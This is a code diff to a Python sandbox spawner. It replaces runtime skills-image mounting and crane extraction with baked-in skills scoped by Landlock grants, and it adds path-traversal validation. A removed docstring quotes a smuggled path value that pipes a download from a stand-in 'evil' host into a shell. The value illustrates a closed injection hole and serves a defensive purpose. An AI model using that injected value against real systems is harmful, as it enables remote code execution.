@@ -19,7 +19,6 @@ import json
 import logging
 import os
 import ssl
-import tempfile
 from typing import TYPE_CHECKING, Any, AsyncIterator, ClassVar
 
 import httpx
@@ -98,8 +97,28 @@ class OpenShellSpawner(AgentSpawner):
     # ready" (issue #192). Value copied verbatim from that Containerfile's
     # `ENV PYTHONPATH=...` line; re-verify against the image source if this
     # ever needs to change (e.g. a Python version bump).
+    #
+    # Where materialize-skills.sh copies the allowed_skills subset so
+    # providers can list it (see _materialize_allowed_skills()). Must be
+    # granted Landlock read_write in _build_baseline_filesystem_policy()
+    # when allowed_skills is set -- /app itself is read-only in the
+    # baseline policy, and Landlock denies writes regardless of the
+    # image's own POSIX chmod/chown, so omitting this grant makes
+    # materialize-skills.sh fail with EACCES even though the sandbox
+    # user nominally owns the directory (reproduced against a real
+    # gateway; POSIX permissions alone are not sufficient).
+    _MATERIALIZED_SKILLS_DIR: ClassVar[str] = "/app/skills"
+
+    # LIGHTSPEED_SKILLS_DIR is set for the same env_clear() reason: the
+    # image's own `ENV LIGHTSPEED_SKILLS_DIR=/app/skills` declaration is
+    # wiped before the exec'd server process starts. Providers must list
+    # /app/skills specifically -- the materialize-skills.sh output
+    # (_do_spawn() execs it before start_server() when allowed_skills is
+    # set) -- not the read-only /skills master, which holds every baked-in
+    # skill regardless of allowed_skills (issue #202).
     _DEFAULT_EXTRA_ENV: ClassVar[dict[str, str]] = {
-        "PYTHONPATH": "/opt/lightspeed/src:/opt/app-root/lib64/python3.12/site-packages"
+        "PYTHONPATH": "/opt/lightspeed/src:/opt/app-root/lib64/python3.12/site-packages",
+        "LIGHTSPEED_SKILLS_DIR": _MATERIALIZED_SKILLS_DIR,
     }
 
     # OpenShell's own hardcoded restrictive_default_policy() (Rust side,
@@ -122,9 +141,22 @@ class OpenShellSpawner(AgentSpawner):
     ]
     _DEFAULT_BASELINE_READ_WRITE: ClassVar[list[str]] = ["/tmp", "/dev/null"]
 
-    # Where skills_image content lands in the sandbox, whether via the
-    # native podman driver_config mount or the crane/tar upload fallback.
-    _SKILLS_TARGET_PATH: ClassVar[str] = "/app/skills"
+    # All available skills are baked into the sandbox image at build time
+    # under this path (see lightspeed-agentic-sandbox's Containerfile) --
+    # outside /app so this spawner's per-skill Landlock grants (see
+    # allowed_skills in _build_baseline_filesystem_policy()) never have to
+    # narrow /app's own baseline grant (needed for Claude Code's own
+    # node_modules/CLI symlink). Nothing writes here at runtime; the old
+    # skills_image/skills_paths runtime mount-and-copy mechanism (issue
+    # #202) is gone.
+    _SKILLS_ROOT: ClassVar[str] = "/skills"
+
+    # Baked into the sandbox image (lightspeed-agentic-sandbox's
+    # Containerfile); copies the allowed_skills subset from _SKILLS_ROOT
+    # into LIGHTSPEED_SKILLS_DIR so providers' directory-listing-based
+    # skill discovery sees only the scoped set. See
+    # _materialize_allowed_skills().
+    _MATERIALIZE_SKILLS_SCRIPT: ClassVar[str] = "/usr/local/bin/materialize-skills.sh"
 
     @staticmethod
     def _validate_extra_readable_paths(paths: list[str]) -> list[str]:
@@ -195,6 +227,30 @@ class OpenShellSpawner(AgentSpawner):
                 raise ValueError("extra_env keys must not be empty")
         return dict(env)
 
+    @staticmethod
+    def _validate_allowed_skills(names: list[str]) -> None:
+        """Validate allowed_skills before building /skills/<name> Landlock paths.
+
+        Entries are meant to be bare directory names (e.g. "k8s-diag"),
+        not paths -- allowing "/" or ".." segments would let a
+        request-supplied name escape _SKILLS_ROOT via naive string
+        joining (issue #202).
+
+        Args:
+            names: Candidate skill names.
+
+        Raises:
+            ValueError: If any name is empty or contains a "/" or ".."
+                segment.
+        """
+        for name in names:
+            if not name:
+                raise ValueError("allowed_skills entries must not be empty")
+            if "/" in name:
+                raise ValueError(f"allowed_skills entries must not contain '/': {name!r}")
+            if name in (".", ".."):
+                raise ValueError(f"allowed_skills entries must not be '.' or '..': {name!r}")
+
     def __init__(
         self,
         openshell_client: Any = None,
@@ -244,7 +300,6 @@ class OpenShellSpawner(AgentSpawner):
         """
         super().__init__(**kwargs)
         self._client = openshell_client
-        self._detected_driver: str | None = None
         self._workspace = workspace
         self._endpoint = endpoint
         self._http_endpoint = http_endpoint
@@ -398,57 +453,6 @@ class OpenShellSpawner(AgentSpawner):
             return endpoint_url, virtual_host
 
         return await asyncio.to_thread(_sync_expose)
-
-    async def _detect_compute_driver(self) -> str:
-        """Query the gateway's own compute driver via GetGatewayInfo(), cached.
-
-        The gateway already knows which compute driver it runs -- there's no
-        need for a caller to configure this out-of-band (and get it wrong,
-        as happened before this method existed; see #198). Used only to pick
-        the skills_image handling strategy in _do_spawn(); nothing else in
-        this spawner's lifecycle depends on the driver at all.
-
-        Best-effort: any failure (RPC error, channel setup error, no drivers
-        reported) fails open to "" rather than raising or guessing a specific
-        driver -- a gateway hiccup here must never block the sandbox from
-        spawning, and "" makes _do_spawn() take the universal skills_image
-        fallback that works regardless of driver. Only a successful,
-        non-empty detection is cached -- a transient failure must not
-        permanently disable the podman native-mount optimization for the
-        rest of this spawner's lifetime (long-lived runner processes reuse
-        one spawner across many spawns), so the next spawn retries instead.
-
-        Returns:
-            The gateway's active compute driver name (e.g. "kubernetes",
-            "podman"), or "" if it couldn't be determined.
-        """
-        if self._detected_driver is not None:
-            return self._detected_driver
-
-        from openshell._proto import openshell_pb2, openshell_pb2_grpc
-
-        def _sync_get_info() -> str:
-            channel = self._create_grpc_channel()
-            try:
-                stub = openshell_pb2_grpc.OpenShellStub(channel)
-                resp = stub.GetGatewayInfo(openshell_pb2.GetGatewayInfoRequest(), timeout=5.0)
-            finally:
-                channel.close()
-            if resp.compute_drivers:
-                return resp.compute_drivers[0].name
-            return ""
-
-        try:
-            detected = await asyncio.to_thread(_sync_get_info)
-        except Exception as exc:  # pylint: disable=broad-exception-caught
-            logger.warning("Failed to detect gateway compute driver: %s", exc)
-            return ""
-
-        if detected:
-            self._detected_driver = detected
-            logger.debug("Detected gateway compute driver: %s", detected)
-            return detected
-        return ""
 
     async def wait_ready(
         self,
@@ -624,6 +628,7 @@ class OpenShellSpawner(AgentSpawner):
         labels: dict[str, str] | None = None,
         skills_image: str | None = None,
         skills_paths: list[str] | None = None,
+        allowed_skills: list[str] | None = None,
         service_account: str | None = None,
         read_only: bool = False,
         credential_secret_name: str | None = None,
@@ -632,6 +637,15 @@ class OpenShellSpawner(AgentSpawner):
     ) -> str:
         """Create an OpenShell sandbox, start HTTP server, return endpoint."""
         from openshell._proto import openshell_pb2
+
+        if skills_image or skills_paths:
+            logger.warning(
+                "skills_image/skills_paths requested for agent '%s' but OpenShellSpawner no "
+                "longer supports them -- skills now ship baked into the sandbox image at "
+                "%s, scoped per-run via allowed_skills instead (issue #202). Ignoring.",
+                agent_name,
+                self._SKILLS_ROOT,
+            )
 
         if service_account:
             logger.info(
@@ -660,33 +674,7 @@ class OpenShellSpawner(AgentSpawner):
         if read_only:
             self._build_filesystem_policy(spec)
         else:
-            self._build_baseline_filesystem_policy(spec, skills_image=skills_image)
-
-        # Skills image: Podman driver mounts the OCI image directly
-        # via driver_config (no extraction needed). Every other driver
-        # (including unknown/undetectable) falls back to tar streaming
-        # after sandbox creation -- see _detect_compute_driver().
-        skills_via_driver_config = False
-        if skills_image and await self._detect_compute_driver() == "podman":
-            from google.protobuf import struct_pb2
-
-            mount_config = struct_pb2.Struct()
-            mount_config.update(
-                {
-                    "podman": {
-                        "mounts": [
-                            {
-                                "type": "image",
-                                "source": skills_image,
-                                "target": self._SKILLS_TARGET_PATH,
-                                "read_only": True,
-                            }
-                        ],
-                    },
-                }
-            )
-            spec.template.driver_config.MergeFrom(mount_config)
-            skills_via_driver_config = True
+            self._build_baseline_filesystem_policy(spec, allowed_skills=allowed_skills)
 
         sandbox_ref = await asyncio.to_thread(
             self._client.create,
@@ -714,22 +702,30 @@ class OpenShellSpawner(AgentSpawner):
                     env,
                 )
 
-            if skills_image and not skills_via_driver_config:
-                await self._load_skills(
-                    agent_name,
-                    sandbox_id,
-                    skills_image,
-                    skills_paths,
-                )
-
             if mcp_secret_mounts:
                 await self._inject_mcp_secrets(agent_name, mcp_secret_mounts, env)
+
+            # Advisory (read_only=True) spawns use _build_filesystem_policy(),
+            # which grants blanket "/" read but no write outside /tmp,
+            # /home/agent, /var/log, MCP, and credentials -- not
+            # _MATERIALIZED_SKILLS_DIR. Materializing there would fail with
+            # the same EACCES this method now raises loudly for, so advisory
+            # spawns skip materialize entirely and list _SKILLS_ROOT (the
+            # master) directly below instead -- consistent with advisory
+            # mode's existing documented semantics that its blanket read
+            # grant already covers all of /skills regardless of
+            # allowed_skills, since advisory is an integrity boundary
+            # (no-write), not a confidentiality one.
+            if allowed_skills and not read_only:
+                await self._materialize_allowed_skills(sandbox_id, allowed_skills)
 
             # self._extra_env first, then the caller's own env on top, so an
             # explicit caller-provided value (e.g. a different derived image's
             # PYTHONPATH) wins on collision rather than being silently
             # overridden by the spawner's own default (issue #192).
             server_env = {**self._extra_env, **env}
+            if read_only:
+                server_env["LIGHTSPEED_SKILLS_DIR"] = self._SKILLS_ROOT
             await self.start_server(sandbox_id, _DEFAULT_SERVER_COMMAND, env=server_env)
 
             endpoint, virtual_host = await self._expose_service(
@@ -796,15 +792,20 @@ class OpenShellSpawner(AgentSpawner):
     def _build_filesystem_policy(spec: "openshell_pb2.SandboxSpec") -> None:
         """Set read-only filesystem policy with write exceptions.
 
-        Allows writes to agent workspace, skills, secrets, and log
-        directories so post-create injection still works in advisory mode.
+        Allows writes to agent workspace, secrets, and log directories so
+        post-create injection still works in advisory mode.
+
+        Note: this grants "/" read-only, which already includes all of
+        _SKILLS_ROOT regardless of allowed_skills -- advisory mode's own
+        design (let the agent read everything to investigate, write
+        nothing) means per-skill Landlock scoping only has effect in the
+        non-advisory baseline policy below, not here.
         """
         spec.policy.filesystem.read_only.append("/")
         for rw_path in (
             "/tmp",
             "/home/agent",
             "/var/log",
-            OpenShellSpawner._SKILLS_TARGET_PATH,
             "/var/secrets/mcp",
             "/var/run/secrets/llm-credentials",
         ):
@@ -812,7 +813,7 @@ class OpenShellSpawner(AgentSpawner):
         spec.policy.filesystem.include_workdir = True
 
     def _build_baseline_filesystem_policy(
-        self, spec: "openshell_pb2.SandboxSpec", skills_image: str | None = None
+        self, spec: "openshell_pb2.SandboxSpec", allowed_skills: list[str] | None = None
     ) -> None:
         """Set the baseline filesystem policy sent for every non-advisory spawn.
 
@@ -838,14 +839,18 @@ class OpenShellSpawner(AgentSpawner):
         /proc, /etc, and /tmp, breaking things worse than the bug this
         fixes.
 
-        When skills_image is set, also grants write access to
-        _SKILLS_TARGET_PATH, matching _build_filesystem_policy()'s existing
-        grant -- without it, the skills_image tar-upload fallback
-        (_load_skills(), used whenever the gateway's compute driver isn't
-        podman) fails with a Landlock "Permission denied" writing into a
-        path that's otherwise read-only under /app's default grant. Scoped
-        to skills_image spawns only, not every non-advisory spawn, to avoid
-        widening the writable surface for spawns that never write there.
+        allowed_skills, if set, grants read-only access to the specific
+        _SKILLS_ROOT/<name> subdirectories named -- all available skills
+        are baked into the sandbox image at build time (see
+        lightspeed-agentic-sandbox), read-only content nothing writes to
+        at runtime, so this is a read grant, not the write grant the old
+        skills_image tar-upload mechanism needed (issue #202). OpenShell's
+        read_only access right already includes execute
+        (AccessFs::from_read() = Execute | ReadFile | ReadDir in the
+        landlock crate OpenShell depends on, confirmed against its
+        source), so skill scripts remain runnable with no separate grant.
+        None or omitted means no skills are visible -- least-privilege
+        default, not "all".
         """
         for path in self._DEFAULT_BASELINE_READ_ONLY:
             spec.policy.filesystem.read_only.append(path)
@@ -853,8 +858,13 @@ class OpenShellSpawner(AgentSpawner):
             spec.policy.filesystem.read_only.append(path)
         for path in self._DEFAULT_BASELINE_READ_WRITE:
             spec.policy.filesystem.read_write.append(path)
-        if skills_image:
-            spec.policy.filesystem.read_write.append(self._SKILLS_TARGET_PATH)
+        if allowed_skills:
+            self._validate_allowed_skills(allowed_skills)
+            for skill_name in allowed_skills:
+                spec.policy.filesystem.read_only.append(f"{self._SKILLS_ROOT}/{skill_name}")
+            # materialize-skills.sh needs to write here; /app itself is
+            # only read-only above.
+            spec.policy.filesystem.read_write.append(self._MATERIALIZED_SKILLS_DIR)
         spec.policy.filesystem.include_workdir = True
         # Already the proto default, but set explicitly to match the
         # live-verified fix YAML in issue #189 exactly.
@@ -988,144 +998,6 @@ class OpenShellSpawner(AgentSpawner):
 
         await asyncio.to_thread(_sync_detach)
 
-    async def _load_skills(
-        self,
-        agent_name: str,
-        sandbox_id: str,
-        skills_image: str,
-        skills_paths: list[str] | None = None,
-    ) -> None:
-        """Load skills from an OCI image into the sandbox.
-
-        Extracts skills content from the image locally via crane, then
-        streams it into the sandbox via exec_stream with tar.
-        """
-        import shutil
-        import tarfile
-        from io import BytesIO
-
-        copy_paths = skills_paths or ["/skills"]
-        tmp_dir = tempfile.mkdtemp(prefix=f"skills-{agent_name}-")
-
-        try:
-            await self._extract_skills_image(
-                skills_image,
-                copy_paths,
-                tmp_dir,
-            )
-
-            tar_buf = BytesIO()
-            with tarfile.open(fileobj=tar_buf, mode="w") as tar:
-                tar.add(tmp_dir, arcname=".")
-            tar_bytes = tar_buf.getvalue()
-
-            def _sync_upload() -> None:
-                for _ in self._client.exec_stream(
-                    sandbox_id,
-                    ["tar", "xf", "-", "-C", self._SKILLS_TARGET_PATH],
-                    stdin=tar_bytes,
-                ):
-                    pass
-
-            await asyncio.to_thread(_sync_upload)
-            logger.info(
-                "Loaded skills into sandbox for agent '%s' from '%s'",
-                agent_name,
-                skills_image,
-            )
-        finally:
-            shutil.rmtree(tmp_dir, ignore_errors=True)
-
-    async def _extract_skills_image(
-        self,
-        skills_image: str,
-        copy_paths: list[str],
-        tmp_dir: str,
-    ) -> None:
-        """Extract skills content from an OCI image to a local directory via crane.
-
-        crane is a static binary with no daemon dependency -- works in any
-        environment (K8s pods, bare runners) without needing a Podman
-        socket. Install it in the runner Containerfile from
-        go-containerregistry releases.
-
-        No fallback: a Podman SDK/CLI fallback previously existed here,
-        but both built the extraction container's copy command via shell
-        string interpolation of caller-supplied `copy_paths`
-        (`sh -c " && ".join(f"cp -r {p} ..." ...)`), letting a value like
-        "/skills; curl evil.sh | sh" execute arbitrary commands (issue
-        #202). crane never invokes a shell -- skills_image is passed as a
-        single argv element to `crane export` -- so removing the fallback
-        chain closes that surface entirely rather than leaving a
-        less-safe extraction method one exception away from being used.
-        If crane is missing or extraction fails, this raises.
-
-        Raises:
-            RuntimeError: If the crane binary isn't found, or `crane
-                export` fails.
-        """
-        import shutil
-        import subprocess
-        import tarfile
-        from io import BytesIO
-
-        crane_bin = shutil.which("crane")
-        if not crane_bin:
-            raise RuntimeError(
-                f"Cannot extract skills image '{skills_image}': crane binary not found. "
-                "Install crane in the runner image (see deploy/workflow-runner/Containerfile)."
-            )
-
-        def _crane_extract() -> None:
-            # The "--" separator stops an option-shaped skills_image (e.g.
-            # "--insecure") from being parsed as a crane flag instead of a
-            # literal image reference.
-            result = subprocess.run(
-                [crane_bin, "export", "--", skills_image, "-"],
-                capture_output=True,
-                timeout=120,
-            )
-            if result.returncode != 0:
-                raise RuntimeError(f"crane export failed: {result.stderr.decode()[:200]}")
-
-            with tarfile.open(fileobj=BytesIO(result.stdout)) as tar:
-                for member in tar:
-                    if member.issym() or member.islnk():
-                        continue
-                    for skill_path in copy_paths:
-                        prefix = skill_path.lstrip("/") + "/"
-                        if not member.name.startswith(prefix):
-                            continue
-                        # Match at most one skill_path per member -- the
-                        # previous version mutated member.name in place and
-                        # kept scanning the remaining copy_paths, so an
-                        # already-stripped name could spuriously match a
-                        # second prefix and get extracted a second time at
-                        # the wrong location.
-                        relative_name = member.name[len(prefix) :]
-                        resolved = os.path.normpath(
-                            os.path.join(tmp_dir, relative_name),
-                        )
-                        # Require an os.sep boundary (or exact equality),
-                        # not just a string prefix -- resolved.startswith(tmp_dir)
-                        # alone would incorrectly accept a sibling directory
-                        # whose name happens to share tmp_dir as a string
-                        # prefix (e.g. tmp_dir="/tmp/skills-x" matching a
-                        # resolved path under "/tmp/skills-xyz/") (issue #202).
-                        if resolved == tmp_dir or resolved.startswith(tmp_dir + os.sep):
-                            member.name = relative_name
-                            # filter="data" is passed explicitly rather than
-                            # relying on tarfile's own default: that default
-                            # only became "data" in Python 3.14 (PEP 706) --
-                            # on 3.12/3.13 (what the runner actually deploys)
-                            # it's still "fully_trusted", so the manual check
-                            # above is the real defense, not this filter.
-                            tar.extract(member, tmp_dir, filter="data")
-                        break
-
-        await asyncio.to_thread(_crane_extract)
-        logger.info("Extracted skills via crane from '%s'", skills_image)
-
     async def _inject_mcp_secrets(
         self,
         agent_name: str,
@@ -1174,6 +1046,58 @@ class OpenShellSpawner(AgentSpawner):
                 pass
 
         await asyncio.to_thread(_sync_mkdir)
+
+    async def _materialize_allowed_skills(self, sandbox_id: str, allowed_skills: list[str]) -> None:
+        """Copy the allowed_skills subset into the provider-listable skills dir.
+
+        Providers discover skills by *listing* LIGHTSPEED_SKILLS_DIR, and
+        Landlock's allow-list model can't grant partial listing of
+        _SKILLS_ROOT without granting full listing (which would defeat
+        per-name scoping) -- see _build_baseline_filesystem_policy(). So
+        instead this execs the sandbox image's baked-in
+        materialize-skills.sh (lightspeed-agentic-sandbox), which copies
+        just these names from _SKILLS_ROOT into a plain, freshly-listable
+        directory. The real enforcement remains the per-name Landlock
+        grant on _SKILLS_ROOT/<name>: an unlisted name is unreadable to
+        this copy too, not merely absent from it.
+
+        Validated independently here (not only in
+        _build_baseline_filesystem_policy()) since this is the sole
+        exec-reaching call site for allowed_skills -- advisory-mode
+        spawns never call this method at all (see _do_spawn(), which
+        skips materialize entirely when read_only=True), so this
+        validation is defense in depth against a future non-advisory
+        call path rather than a gap advisory mode would otherwise hit.
+
+        Raises:
+            RuntimeError: If materialize-skills.sh exits nonzero (e.g. the
+                Landlock write grant is missing, or an older image predates
+                the script entirely -- ENOENT/127). exec_stream() does not
+                raise on a nonzero exit by itself, so without this check a
+                failed materialize silently leaves the sandbox with no (or
+                partial) skills while spawn() reports success -- exactly
+                the failure this method exists to prevent, reproduced
+                live against a real gateway before this check was added.
+        """
+        self._validate_allowed_skills(allowed_skills)
+
+        def _sync_materialize() -> Any:
+            result = None
+            for item in self._client.exec_stream(
+                sandbox_id,
+                [self._MATERIALIZE_SKILLS_SCRIPT, *allowed_skills],
+            ):
+                if hasattr(item, "exit_code"):
+                    result = item
+            return result
+
+        result = await asyncio.to_thread(_sync_materialize)
+        if result is None or result.exit_code != 0:
+            raise RuntimeError(
+                f"materialize-skills.sh failed for sandbox '{sandbox_id}' "
+                f"(allowed_skills={allowed_skills}): "
+                f"{getattr(result, 'stderr', '<no exec result>')}"
+            )
 
     async def start_server(
         self,
